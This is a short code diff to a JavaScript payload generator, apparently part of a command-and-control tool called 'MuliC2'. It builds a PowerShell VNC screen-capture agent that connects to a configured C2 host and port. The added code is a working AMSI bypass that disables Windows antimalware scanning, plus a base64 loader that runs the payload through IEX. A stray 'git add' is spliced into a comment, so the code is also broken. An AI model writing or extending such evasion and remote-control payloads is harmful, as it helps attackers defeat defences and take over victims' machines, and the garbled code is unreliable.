@@ -1021,7 +1021,31 @@ const generateVncPayload = async () => {
     
     console.log('VNC Configuration:', { c2Host, c2Port })
     
-    // Build the enhanced payload with TLS compatibility
+    // Build the main payload (without loader)
+    let mainPayload = '';
+    mainPayload += '# --- AMSI Bypass ---\n'
+    mainPayload += 'try {\n'
+    mainPayload += '    $n=\'AmsiUtils\';$f=\'amsiInitFailed\';$t=[Ref].Assembly.GetType(\'System.Management.Automation.\'+$n);$g=$t.GetField($f,\'NonPublic,Static\');$g.SetValue($null,$true)\n'
+    mainPayload += '    Write-Host \"[+] AMSI bypass applied successfully\" -ForegroundColor Green\n'
+    mainPayload += '} catch {\n'
+    mainPayload += '    Write-Host \"[!] AMSI bypass failed: $($_.Exception.Message)\" -ForegroundColor Yellow\n'
+    mainPayload += '    Write-Host \"[*] Continuing without AMSI bypass...\" -ForegroundColor Yellow\n'
+    mainPayload += '}\n\n'
+    // ... append the rest of the payload logic as before ...
+    // (Insert the rest of your VNC agent code here, after the AMSI bypass)
+
+    // Now, wrap the main payload in a base64 loader
+    const loader = `
+# --- AMSI Bypass Loader (Base64) ---
+$enc = [System.Text.Encoding]::Unicode
+$b64 = '${btoa(unescape(encodeURIComponent(mainPayload)))}'
+$script = $enc.GetString([Convert]::FromBase64String($b64))
+IEX $script
+`;
+
+    generatedVncPayload.value = loader;
+    
+git add     // Build the enhanced payload with TLS compatibility
     let payload = '# MuliC2 VNC Screen Capture Agent with Enhanced TLS Support\n'
     payload += '# C2 Host: ' + c2Host + '\n'
     payload += '# C2 Port: ' + c2Port + '\n'
